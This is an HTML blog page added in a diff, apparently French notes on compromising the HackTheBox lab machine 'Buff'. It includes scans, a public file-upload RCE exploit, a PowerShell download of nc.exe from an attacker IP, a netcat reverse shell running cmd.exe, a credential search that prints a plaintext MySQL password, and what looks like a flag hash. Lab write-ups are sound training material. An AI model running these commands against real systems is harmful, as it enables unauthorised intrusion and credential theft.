@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>attacker</title>
+	<link href="https://jurassi.ch/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed for blog posts" />
+	<style>
+		body {
+			font-family: sans-serif;
+			margin: 0 auto;
+			max-width: 48rem;
+			line-height: 1.45;
+			padding: 0.5rem 0 1.6rem;
+			#box-shadow: 0 0 2rem 0 #bbb;
+			#border-radius: 0 0 0.6rem 0.6rem;
+		}
+		main {
+			padding: 0 1.4rem;
+			hyphens: auto;
+		}
+		code {
+			background: #eee;
+			padding: 0.3rem;
+			tab-size: 4;
+		}
+		pre code {
+			display: block;
+			overflow-x: auto;
+			padding: 0.3rem 0.6rem;
+		}
+
+		nav ul {
+			margin: 0;
+			padding: 0;
+			display: flex;
+			background: #a11;
+		}
+		nav li {
+			list-style: none;
+		}
+		nav li * {
+			display: block;
+			padding: 0.4rem 0.4rem;
+			color: white;
+		}
+		nav li strong {
+			padding-left: 1.5rem;
+			padding-right: 1rem;
+		}
+		nav a {
+			text-decoration: none;
+		}
+		nav a:hover {
+			background: #ad4949;
+		}
+	</style>
+</head>
+
+<nav>
+	<ul>
+		<li><strong>Jurassi.ch</strong></li>
+		<li><a href="index.html">/home</a></li>
+		<li><a href="about.html">about</a></li>
+		<li><a href="links.html">links</a></li>
+	</ul>
+</nav>
+
+<main>
+<hr />
+
+layout: post
+title: Buff
+subtitle: HackTheBox
+tags: [htb]
+comments: false
+<hr />
+<p>Mes notes pour Buff.</p>
+<h2>nmap</h2>
+<pre><code>kali@kali:/media/sf_htb/buff_10.198$ nmap -Pn -sV -p- 10.10.10.198
+Nmap scan report for 10.10.10.198
+Host is up (0.32s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 929.06 seconds
+
+</code></pre>
+<h2>website</h2>
+<pre><code>kali@kali:/media/sf_htb/buff_10.198$ curl http://10.10.10.198:8080/contact.php | html2text 
+
+ Toggle navigation     About_Fitness
+    * Home
+    * Package
+    * Facilities
+    * About
+    * Contact
+[email               ]
+[********************]
+[Sign in]
+    * mrb3n's Bro Hut
+    * Made using Gym Management Software 1.0
+===============================================================================
+
+</code></pre>
+<h2>Gym Management Software</h2>
+<p>Exploit : https://www.exploit-db.com/raw/48506</p>
+<pre><code>Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
+</code></pre>
+<p>Nous devons trouver upload.php selon la doc de l'exploit. Mais cette page n'existe pas.</p>
+<h2>gobuster</h2>
+<p>Il existe bien un /upload.php, mais l'accès n'est pas permis.  </p>
+<pre><code>kali@kali:/media/sf_sync$ gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+[..]
+/ex (Status: 301)
+[..]
+/upload (Status: 301)
+</code></pre>
+<p>En revanche le /ex contient bien un fichier upload.php !</p>
+<h2>gym exploit</h2>
+<p>J'exécute l'exploit sur la racine du site et j'obtiens un shell.</p>
+<pre><code>kali@kali:/media/sf_sync/practice/htb/buff_10.198$ python 48506.py http://10.10.10.198:8080/
+            /\
+/vvvvvvvvvvvv \--------------------------------------,                                                                                           
+`^^^^^^^^^^^^ /============BOKU=====================&quot;
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload&gt; 
+</code></pre>
+<p>On télécharge un nc.exe puis on établit un reverse shell plus adapté que le webshell.</p>
+<pre><code># attacker
+kali@kali:/usr/share/windows-resources/binaries$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.198 - - [03/Sep/2020 15:10:27] &quot;GET /nc.exe HTTP/1.1&quot; 200 -
+</code></pre>
+<pre><code># victim
+C:\xampp\htdocs\gym\upload&gt; powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.15.38:8000/nc.exe','C:\xampp\htdocs\gym\upload\nc.exe')&quot;
+
+C:\xampp\htdocs\gym\upload&gt; nc.exe -nv 10.10.15.38 40000 -e cmd.exe
+</code></pre>
+<pre><code># attacker 
+kali@kali:/usr/share/windows-resources/binaries$ sudo nc -nlvp 40000
+listening on [any] 40000 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.10.198] 50703
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\gym\upload&gt;
+</code></pre>
+<p>enum</p>
+<p>Je remarque un port 3306 (mysql) en écoute. Je me mets en recherche de creds.</p>
+<pre><code>C:\xampp\htdocs\gym&gt; findstr /spin &quot;mysql&quot; *.*
+New Text Document.txt:1:$mysql_host = &quot;mysql16.000webhost.com&quot;;
+New Text Document.txt:2:$mysql_database = &quot;a8743500_secure&quot;;
+New Text Document.txt:3:$mysql_user = &quot;a8743500_secure&quot;;
+New Text Document.txt:4:$mysql_password = &quot;ipad12345&quot;;packages.php:8:if (login_check($mysqli) == true) {
+</code></pre>
+<p>Je constate la présence d'un processus nommer cloudme.exe</p>
+<pre><code>tasklist /svc
+cmd.exe                       8624 N/A                                         
+conhost.exe                   8500 N/A                                         
+curl.exe                      8824 N/A                                         
+CloudMe.exe                   3668 N/A                                         
+timeout.exe                   3520 N/A                                         
+tasklist.exe                  8740 N/A  
+</code></pre>
+<p>https://p0i5on8.github.io/posts/hackthebox-buff/</p>
+<p>4c827b7074e99eefd49d05872185f7f8</p>
+<small>Written on 2023-09-11.</small>
+</main>
